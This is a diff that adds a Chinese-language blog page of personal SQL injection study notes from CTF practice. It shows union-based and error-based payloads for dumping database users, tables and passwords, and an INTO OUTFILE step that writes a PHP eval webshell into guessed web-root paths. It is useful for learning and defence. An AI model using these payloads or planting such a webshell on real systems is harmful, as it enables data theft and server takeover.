@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">SQL大赏！！！</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-12-11</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-30</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 知识点
+            
+        </div>
+        
+        <div class="article-content">
+            <h1 id="SQL大赏！！！！"><a href="#SQL大赏！！！！" class="headerlink" title="SQL大赏！！！！"></a>SQL大赏！！！！</h1><p>这个是记录我学习sql的。</p>
+<p>sql是一种对数据库进行管理的语言，在web中最常出现的便是sql注入，其他的题型，我还没见过，所以不做考虑。</p>
+<p>SQL 注入就是指 Web 应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<p>这边是一个非常官方性质的解释，按我自己个人的理解，sql注入就是将我们想要执行的操作通过构造sql的形式，绕过web的过滤或者识别，最终完成的句子。</p>
+<p>sql，我个人喜欢的就是分为三种。</p>
+<h2 id="一-回显型的sql注入"><a href="#一-回显型的sql注入" class="headerlink" title="一.回显型的sql注入"></a><strong>一.回显型的sql注入</strong></h2><p>这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。</p>
+<h1 id="union-注入-联合注入-："><a href="#union-注入-联合注入-：" class="headerlink" title="#union 注入(联合注入)："></a>#union 注入(联合注入)：</h1><h2 id="数字型："><a href="#数字型：" class="headerlink" title="##数字型："></a>##数字型：</h2><p><code>id=-1 UNION SELECT 1, user(), 3(数字型)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：这里的 $id 两边没有单引号</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后得到 <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, user(), 3</code></p>
+<p><strong>原理</strong>：利用变量周围不存在单引号的情况，将我们希望执行的命令拼接进入sql语句。在这里就是让数据库去找id&#x3D;-1的内容，但由于id&#x3D;-1没有内容， 返回为null，再通过union，将前半段命令和后半段命令连接起来，使数据库不显示原本news的东西，而是显示1，<code>use()</code>,3。<code>user()</code>是mysql中的一个函数，作用是显示当前数据库的登入用户。</p>
+<p><code>id=-1 UNION SELECT 1, database(), 3(数字型)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：无引号保护</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后得到  <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, database(), 3</code></p>
+<p><strong>原理：</strong> 利用变量周围不存在单引号的情况，将 SQL 命令拼接进去。这里同样让前半段 <code>id=-1</code> 返回空（null）。然后通过 <code>UNION</code>，在原本显示其他内容的位置显示<code>datebase()</code>函数的值。<code>database()</code>: MySQL 的内置函数，作用是显示当前网站正在使用的数据库名称（比如 <code>ctf_db</code>）。</p>
+<p><code>id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()(数字型)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：无引号保护</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后得到: <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()</code></p>
+<p><strong>原理</strong>：除了基本的 <code>UNION</code> 拼接外，这里又多了一些内容。</p>
+<ol>
+<li><code>information_schema.tables</code>: 这是 MySQL 自带的一个元数据库表，里面记录了整个数据库服务器里所有表的名单。</li>
+<li><code>WHERE table_schema=database()</code>: 加这个条件是为了过滤，只筛选出当前网站数据库里的表名，防止把其他的都查出来。</li>
+<li><code>group_concat(table_name)</code>: 这一点至关重要。因为网页的回显位通常只有一行，而表名可能有好几个。如果直接查，只能显示第一个。<code>group_concat</code> 的作用是将多行查询结果合并成一个字符串（用逗号分隔），全部打包显示出来。</li>
+</ol>
+<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h3 id="第一阶段：侦察"><a href="#第一阶段：侦察" class="headerlink" title="第一阶段：侦察"></a>第一阶段：侦察</h3><h4 id="Step-1-确认注入点"><a href="#Step-1-确认注入点" class="headerlink" title="Step 1: 确认注入点"></a>Step 1: 确认注入点</h4><p><strong>目标：</strong> 确定 <code>SELECT *</code> 到底代表几列，为后面的 <code>UNION</code> 做准备。 <strong>核心命令：</strong> <code>ORDER BY</code></p>
+<ol>
+<li><p><strong>验证数字型：</strong></p>
+<ul>
+<li>输入 <code>id=2-1</code>。如果页面显示的内容和 <code>id=1</code> 一样，说明数据库执行了减法运算，确认为数字型注入。</li>
+</ul>
+</li>
+<li><p><strong>二分法&#x2F;递增法测试：</strong></p>
+<ul>
+<li><p><code>id=1 ORDER BY 10</code> (报错&#x2F;空) -&gt; 太多了。</p>
+</li>
+<li><p><code>id=1 ORDER BY 5</code> (报错&#x2F;空) -&gt; 还是多。</p>
+</li>
+<li><p><code>id=1 ORDER BY N</code> (正常显示) -&gt; 这里的 <strong>N</strong> 就是我们要找的关键数字 。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="Step-2-寻找回显位"><a href="#Step-2-寻找回显位" class="headerlink" title="Step 2: 寻找回显位"></a>Step 2: 寻找回显位</h4><p><strong>目标：</strong> 看看这 N 列中，哪几列的数据会被打印在网页上。 <strong>核心命令：</strong> <code>-1 UNION SELECT</code> +</p>
+<p><strong>操作：</strong> 让前半部分 ID 失效，强制显示后半部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, 2, 3</span><br></pre></td></tr></table></figure>
+
+<p><strong>观察：</strong> 看看网页上原本显示标题的地方变成了 <code>2</code>，还是 <code>3</code>？</p>
+<p><strong>结果</strong>：得到输出点</p>
+<h3 id="第二阶段：取证"><a href="#第二阶段：取证" class="headerlink" title="第二阶段：取证"></a>第二阶段：取证</h3><h4 id="Step-3-爆数"><a href="#Step-3-爆数" class="headerlink" title="Step 3: 爆数"></a>Step 3: 爆数</h4><p><strong>目标：</strong> 知道我们在哪个库里，版本是多少（版本决定了能不能用 <code>information_schema</code>）。 <strong>核心命令：</strong> <code>database()</code>, <code>version()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, database(), 3</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论</strong>：得到数据库的名字。</p>
+<h3 id="第三阶段：拖库"><a href="#第三阶段：拖库" class="headerlink" title="第三阶段：拖库"></a>第三阶段：拖库</h3><h3 id="Step-4-爆表名"><a href="#Step-4-爆表名" class="headerlink" title="Step 4: 爆表名"></a>Step 4: 爆表名</h3><p><strong>目标：</strong> 拿到当前数据库下所有的表名。 <strong>核心库：</strong> <code>information_schema.tables</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, group_concat(table_name), 3</span><br><span class="line">FROM information_schema.tables</span><br><span class="line">WHERE table_schema = &#x27;数据库&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>记下来：</strong> 假设结果是 <code>news, users, logs</code>。目标显然是 <strong><code>users</code></strong>。</p>
+<h4 id="Step-5-爆列名"><a href="#Step-5-爆列名" class="headerlink" title="Step 5: 爆列名"></a>Step 5: 爆列名</h4><p><strong>目标：</strong> 拿到 <code>users</code> 表里都有哪些字段（比如账号、密码叫什么）。 <strong>核心库：</strong> <code>information_schema.columns</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, group_concat(column_name), 3</span><br><span class="line">FROM information_schema.columns</span><br><span class="line">WHERE table_name = &#x27;users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><em>(注意：如果不同库有同名表，最好加上 <code>AND table_schema=&#39;ctf_db&#39;</code>)</em></p>
+<ul>
+<li><strong>记下来：</strong> 假设结果是 <code>id, username, password, flag</code>。目标显然是 <strong><code>flag</code></strong> 或者 <code>password</code>。</li>
+</ul>
+<h4 id="Step-6-爆数据"><a href="#Step-6-爆数据" class="headerlink" title="Step 6: 爆数据"></a>Step 6: 爆数据</h4><p><strong>目标：</strong> 取出最终的秘密。 <strong>核心表：</strong> 直接查 Step 4 拿到的表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, group_concat(username, &#x27;~&#x27;, password), 3</span><br><span class="line">FROM users</span><br></pre></td></tr></table></figure>
+
+<p><strong>结果：</strong> <code>admin~123456, root~flag{congratulations}</code></p>
+<hr>
+<h2 id="字符型："><a href="#字符型：" class="headerlink" title="##字符型："></a>##字符型：</h2><p>除了数字型的，还有字符型的。</p>
+<p>两位的区别就是在于，获取参数的地方，字符型的，参数加上了单引号或双引号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">假设后端代码是这样的：</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：变量 $id 被单引号包裹</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>如果你还用数字型的 Payload：<code>id=-1 UNION SELECT 1, database(), 3</code>。</p>
+<p>拼接后的 SQL 变成了：<code>SELECT * FROM users WHERE id = &#39;-1 UNION SELECT 1, database(), 3&#39;</code></p>
+<p><strong>结果：</strong> 数据库把我们注入的整体当成了一个普通的字符串 ID。它会去查找 ID 为 <code>&quot;-1 UNION SELECT 1, database(), 3&quot;</code> 的用户。这显然查不到，但也不会报错，更不会执行你的命令。所以我们的注入就完全没有起到作用了。</p>
+<p>因此，在字符型中，我们就需要学会闭合，注释……</p>
+<p>比如说：</p>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h4><p><code>id=-1&#39; UNION SELECT 1, database(), 3 --+</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id = &#x27;$id&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>SQL注入，拼接后得到： <code>SELECT * FROM users WHERE id = &#39;-1&#39; UNION SELECT 1, database(), 3 --+&#39;</code></p>
+<p><strong>注意</strong>：我们在-1后加了一个单引号，正好这个单引号跟源码中参数前面的单引号拼接成功，变成了   ‘-1’  ,所以前面就变成了 <code>SELECT * FROM users WHERE id = &#39;-1&#39;</code> 刚好完成了前面的闭合。所以我们的UNION就起到了作用。 但还有一个问题，参数后面还有一个单引号，–+就是在这里作用的， <code>--</code> 是 SQL 中的注释符，  <code>+</code> 在 URL 中代表空格（因为 <code>--</code> 后面必须加空格才生效），所以这个时候后面的单引号就被 –+ 注释掉了，并不会对我们的其他内容产生影响，我们的sql注入就从单引号里面逃逸出来了。</p>
+<p>其实%23和#也能起到跟–+起到相同的作用。</p>
+<h3 id="小总结：-1"><a href="#小总结：-1" class="headerlink" title="小总结："></a>小总结：</h3><p>字符型的大概流程其实跟数字型的差不多，只是多了一步逃逸。</p>
+<h4 id="Step-1-确认是字符型-判断闭合符"><a href="#Step-1-确认是字符型-判断闭合符" class="headerlink" title="Step 1: 确认是字符型 &amp; 判断闭合符"></a>Step 1: 确认是字符型 &amp; 判断闭合符</h4><p><strong>目标：</strong> 搞清楚程序员是用单引号 <code>&#39;</code> 还是双引号 <code>&quot;</code> 包裹参数的。</p>
+<p><strong>测试 1：</strong> 输入 <code>id=1&#39;</code> (加个单引号)。				<strong>现象：</strong> 页面报错 (Syntax error)。</p>
+<p><strong>推断：</strong> 很有可能是单引号注入。因为你输入的 <code>&#39;</code> 打破了原本的成对引号，变成了 3 个引号。</p>
+<p><strong>测试 2：</strong> 输入 <code>id=1&#39; --+</code> (加单引号并注释)。			<strong>现象：</strong> 页面恢复正常。</p>
+<p><strong>结论：</strong> 确认是 <strong>单引号字符型注入</strong>。</p>
+<h4 id="Step-2-猜列数"><a href="#Step-2-猜列数" class="headerlink" title="Step 2: 猜列数"></a>Step 2: 猜列数</h4><p><strong>注意：</strong> 这里必须带上闭合符和注释符！</p>
+<ul>
+<li><code>id=1&#39; ORDER BY 3 --+</code><ul>
+<li><strong>拼接后：</strong> <code>... WHERE id = &#39;1&#39; ORDER BY 3 --+&#39;</code></li>
+<li><strong>原理解析：</strong> 如果不加 <code>&#39;</code> 和 <code>--+</code>，<code>ORDER BY</code> 就会被当成 ID 的一部分，导致报错。</li>
+</ul>
+</li>
+</ul>
+<h4 id="Step-3-找回显位"><a href="#Step-3-找回显位" class="headerlink" title="Step 3: 找回显位"></a>Step 3: 找回显位</h4><ul>
+<li><code>id=-1&#39; UNION SELECT 1, 2, 3 --+</code><ul>
+<li><strong>注意：</strong> 同样要有 <code>&#39;</code> 和 <code>--+</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="Step-4-5-6-爆数据"><a href="#Step-4-5-6-爆数据" class="headerlink" title="Step 4, 5, 6: 爆数据"></a>Step 4, 5, 6: 爆数据</h4><p>和数字型完全一样，只是每次都要记得在最前面加 <code>&#39;</code>，最后面加 <code>--+</code>。</p>
+<p><code>id=-1&#39; UNION SELECT 1, database(), 3 --+</code>。</p>
+<hr>
+<h2 id="延伸：文件注入"><a href="#延伸：文件注入" class="headerlink" title="##延伸：文件注入"></a>##延伸：文件注入</h2><p>这个我在做sql lab 第七题时候新见到的，</p>
+<p>因为不管怎么注入，如果语句正确，题目只会回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>
+
+<p>说明正确注入时，所有的回显都被后台设置为了这样的语句。</p>
+<p>然后采用报错注入，就一直显示sql语句错误。</p>
+<p>搜索一番后，才明白，这个延伸类型。</p>
+<p>所以，这边就暂时总结一个使用文件注入的背景。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无回显环境：当页面不显示任何数据库查询结果，甚至连报错信息都不给时，文件注入可以把结果“写”出来给你看。</span><br></pre></td></tr></table></figure>
+
+<p>后端源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">if($row) &#123;</span><br><span class="line">    echo &quot;You are in.... Use outfile......&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先进行的是探测攻击。</p>
+<p>这边用的命令跟前面的差不了多少。</p>
+<p>找到恰好使网页显示sql语句错误的闭合方式，然后用 ?id&#x3D;1 ORDER BY ?  判断列数。</p>
+<p>之后便是查看文件的写入路径，毕竟我们得先有路径才能直接文件写入的注入攻击。</p>
+<p><strong>常用的方法两种：</strong></p>
+<p>一.</p>
+<p><code>phpinfo.php</code> 直接访问。</p>
+<p>当然了这个方法大部分时候都无法成功，所以我们就得用第二种了。</p>
+<p>二.</p>
+<p>强制报错：</p>
+<ol>
+<li><p>给参数传一个它无法处理的类型，例如：<code>?id=1[]</code>（把 ID 变成数组）。</p>
+</li>
+<li><p>访问一个不存在的文件或故意造成逻辑错误：<code>?id=-1&#39;&#39;))</code>。</p>
+</li>
+</ol>
+<p>其他的方法待搜集，不过猜是万法。</p>
+<p>这边给一个小表格：</p>
+<table>
+<thead>
+<tr>
+<th><strong>phpStudy (Windows)</strong></th>
+<th><code>C:/phpStudy/WWW/</code>, <code>D:/phpStudy/WWW/</code>, <code>C:/phpstudy_pro/WWW/</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>XAMPP (Windows)</strong></td>
+<td><code>C:/xampp/htdocs/</code></td>
+</tr>
+<tr>
+<td><strong>WAMP (Windows)</strong></td>
+<td><code>C:/wamp/www/</code></td>
+</tr>
+<tr>
+<td><strong>Linux (Apache)</strong></td>
+<td><code>/var/www/html/</code>, <code>/var/www/</code></td>
+</tr>
+<tr>
+<td><strong>Linux (Nginx)</strong></td>
+<td><code>/usr/share/nginx/html/</code></td>
+</tr>
+</tbody></table>
+<p>可以根据服务器环境直接猜测位置。</p>
+<p>当知道了文件绝对路径后，我们就可以进行攻击了。</p>
+<p>注入<code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;C:\\phpStudy\\WWW\\shell.php&quot; --+</code></p>
+<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p><strong><code>?id=1&#39;))</code></strong>：</p>
+<ul>
+<li>我们要让前面的查询失效或闭合。</li>
+<li>我们的 <code>1&#39;))</code> 让它变成了 <code>WHERE id=((&#39;1&#39;))</code>，语法完美契合。</li>
+</ul>
+<p><strong><code>union select 1,2,...</code></strong>：</p>
+<ul>
+<li><code>union</code> 要求前后的列数必须一致。</li>
+<li>前面查的是 3 列，所以我们也要写 3 列。</li>
+<li>我们将前两列填入数字 <code>1,2</code>，<strong>第三列填入我们的木马代码</strong>。这样，写入文件时，木马就会被当作“数据”存进去。</li>
+</ul>
+<p><strong><code>&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></strong>：</p>
+<ul>
+<li><code>@</code>：抑制错误输出，防止被管理员发现。</li>
+<li><code>eval()</code>：PHP 的灵魂函数，它能把字符串当作代码执行。</li>
+<li><code>$_POST[&quot;cmd&quot;]</code>：通过 POST 方式接收名为 <code>cmd</code> 的指令。</li>
+</ul>
+<p><strong><code>into outfile &quot;C:\\...\\shell.php&quot;</code></strong>：</p>
+<ul>
+<li><strong>双斜杠之谜</strong>：在 Windows 和 SQL 语法中，反斜杠 <code>\</code> 具有转义含义。如果你写 <code>C:\n...</code>，系统可能把它理解为“换行”。因此必须用 <code>\\</code> 表示一个纯粹的反斜杠，或者直接改用 Linux 式的正斜杠 <code>/</code>（MySQL 同样支持）。</li>
+</ul>
+<p>当这一个攻击能成功后，之后的所有攻击就简单了。</p>
+<p>有时候也会存在waf的情况，要注入绕过。</p>
+<hr>
+<h1 id="报错注入："><a href="#报错注入：" class="headerlink" title="#报错注入："></a>#报错注入：</h1><p>这同样也是一种存在回显的sql注入，与上面联合注入不同的是，报错注入是因为服务器的源码将union禁止了，正常的显示方式变了。</p>
+<p>变成类似这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">    // 把数据库的错误信息直接打印到了网页上</span><br><span class="line">    echo mysql_error(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将报错的信息直接打印在了网页上。</p>
+<p>这边做一个简单的比较：</p>
+<table>
+<thead>
+<tr>
+<th><strong>特性</strong></th>
+<th>**联合注入 **</th>
+<th>**报错注入 **</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>逻辑本质</strong></td>
+<td><strong>拼凑</strong></td>
+<td><strong>报错</strong></td>
+</tr>
+<tr>
+<td><strong>运作方式</strong></td>
+<td>利用 <code>UNION</code> 将原本查询的结果和恶意查询的结果拼接在一起。</td>
+<td>利用特殊函数的逻辑，在抛出系统错误时，强制包含查询结果。</td>
+</tr>
+<tr>
+<td><strong>数据通道</strong></td>
+<td><strong>正常的数据展示通道</strong> (网页的正文、标题等)。</td>
+<td><strong>报错信息提示通道</strong> (网页的 Debug 信息、警告框)。</td>
+</tr>
+<tr>
+<td><strong>SQL 状态</strong></td>
+<td>SQL 语句必须语法正确，逻辑通顺。</td>
+<td>构造的 SQL 语句在逻辑上必须是错误的（才能触发报错）。</td>
+</tr>
+</tbody></table>
+<p>相比来看，报错注入需要的步骤更简单，但报错注入还是存在弊端的，因为报错内容是有限制的，如果报错信息太长了，那么有可能会将flag切断。</p>
+<p>这个时候就需要 用<code>substr()</code> 或 <code>substring()</code>函数将报错信息一段一段的切开来看。</p>
+<p>通常来看，报错注入利用的是 MySQL 中最经典的 XML 处理函数。它们本意是用来查询 XML 数据的，但如果 XPath 格式写错了，它们会报错并把错误内容显示出来。</p>
+<p>这边引用之前看到的一篇文章。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2160400">https://cloud.tencent.com/developer/article/2160400</a></p>
+</blockquote>
+<p>常用的报错函数：</p>
+<p><code>updatexml()</code> </p>
+<p><strong>函数原型：</strong> <code>updatexml(XML_document, XPath_string, new_value)</code></p>
+<ol>
+<li>**<code>XML_document</code> **: 也就是你要修改的那段 XML 内容（比如 <code>&lt;book&gt;&lt;title&gt;A&lt;/title&gt;&lt;/book&gt;</code>）。</li>
+<li>**<code>XPath_string</code> **: 类似于文件路径，告诉数据库你要修改哪一部分（比如 <code>/book/title</code>）。</li>
+<li><strong><code>new_value</code></strong> : 你要把那部分内容改成什么（比如 <code>B</code>）。</li>
+</ol>
+<p><strong>正常使用时：</strong> 数据库会根据你给的第 2 个参数，去找到第 1 个参数里的对应位置，用第 3 个参数替换掉。</p>
+<p>这原本就是一个处理xml数据的函数。</p>
+<p>XML数据：</p>
+<school>
+    <student>
+        <id>101</id>
+        <name>张三</name>
+        <score>95</score>
+    </student>
+    <student>
+        <id>102</id>
+        <name>李四</name>
+        <score>88</score>
+    </student>
+</school> 
+
+<p>看起来很像html。</p>
+<p>举个例子，就以上面的XML数据为源码，</p>
+<p><code>updatexml(xml_data,&#39;/school/student[1]/score&#39;,&#39;&lt;score&gt;100&lt;/score&gt;&#39;)</code></p>
+<p>使用这个函数，在xml文章中找到第一个student的分数部分，将其改为100。</p>
+<p><strong>而在报错注入中，我们的使用就不是这样了：</strong></p>
+<p><code>updatexml(1, concat(0x7e, (select user()), 0x7e), 1)</code></p>
+<p><strong>因为存在两个机制：</strong></p>
+<p>**机制 A：**MySQL 的报错机制 <code>updatexml</code> 的第二个参数要求必须是合法的 XPath 格式（例如 <code>/root/node</code>）。 如果你传入一个包含特殊符号（如波浪号 <code>~</code>）的字符串，MySQL 无法解析它，就会报错。 最关键的是：MySQL 会在报错信息里，把这个“错误的字符串”完整地打印出来！</p>
+<p>**机制 B：**SQL 的执行顺序 SQL 语句在执行函数时，会先计算参数里的子查询，然后再执行函数本身。</p>
+<p>所以在我们的报错注入的例子中，数据库会先执行 <code>select user()), 0x7e)</code> 去把数据库当前的账号打印出来，类似<code>root@localhost</code> ，<code>0x7e</code> 是波浪号的16进制，在这里的作用是拼接内容，变成 <code>&#39;~root@localhost~&#39;</code> 而在函数 <code>updatexml()</code> 中，因为第二个的参数必须为有效的 XPath 路径，而 <code>&#39;~root@localhost~&#39;</code> 不是有效路径，因此数据库就会报错，将当前账号的信息以报错的内容打印在网页上。</p>
+<p>如果不加波浪号，有可能会因为格式合法，导致数据库没有报错，从而看不见我们要的信息。</p>
+<p>以上就是简单的报错注入的例子。</p>
+<p>当然了，报错注入利用的函数还有很多，有可能因为题目不同的黑名单，导致 <code>updatexml()</code> 这个函数用不了，这边简单记录几个其他函数以及它们的用法，更具体的我会在开一个文章写。</p>
+<hr>
+<h3 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1. extractvalue()"></a>1. <code>extractvalue()</code></h3><p>这是最接近 <code>updatexml()</code> 的替代品，原理完全相同（都是 XPath 语法错误）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-floor-rand-group-by"><a href="#2-floor-rand-group-by" class="headerlink" title="2. floor() + rand() + group by"></a>2. <code>floor()</code> + <code>rand()</code> + <code>group by</code></h3><p>这是最经典的报错注入方式，通杀 MySQL 5.x 到 8.x 版本。利用 <code>group by</code> 在临时表插入数据时的主键冲突（Duplicate entry）报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND (SELECT 1 FROM (SELECT count(*), concat(user(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-几何函数报错"><a href="#3-几何函数报错" class="headerlink" title="3. 几何函数报错"></a>3. 几何函数报错</h3><p>在较新的 MySQL 版本（尤其是 5.7 和 8.0）中，引入了很多处理几何数据的函数。如果传入非法的格式，它们也会报错并回显数据。</p>
+<h4 id="A-ST-LatFromGeoHash"><a href="#A-ST-LatFromGeoHash" class="headerlink" title="A. ST_LatFromGeoHash()"></a>A. <code>ST_LatFromGeoHash()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND ST_LatFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+<h4 id="B-ST-LongFromGeoHash"><a href="#B-ST-LongFromGeoHash" class="headerlink" title="B. ST_LongFromGeoHash()"></a>B. <code>ST_LongFromGeoHash()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND ST_LongFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+<h4 id="C-ST-PointFromGeoHash"><a href="#C-ST-PointFromGeoHash" class="headerlink" title="C. ST_PointFromGeoHash()"></a>C. <code>ST_PointFromGeoHash()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND ST_PointFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-GTID-函数报错"><a href="#4-GTID-函数报错" class="headerlink" title="4. GTID 函数报错"></a>4. GTID 函数报错</h3><p>利用全局事务标识符（GTID）相关函数进行报错。</p>
+<h4 id="A-GTID-SUBSET"><a href="#A-GTID-SUBSET" class="headerlink" title="A. GTID_SUBSET()"></a>A. <code>GTID_SUBSET()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND GTID_SUBSET(concat(0x7e, (SELECT user()), 0x7e), 1)</span><br></pre></td></tr></table></figure>
+
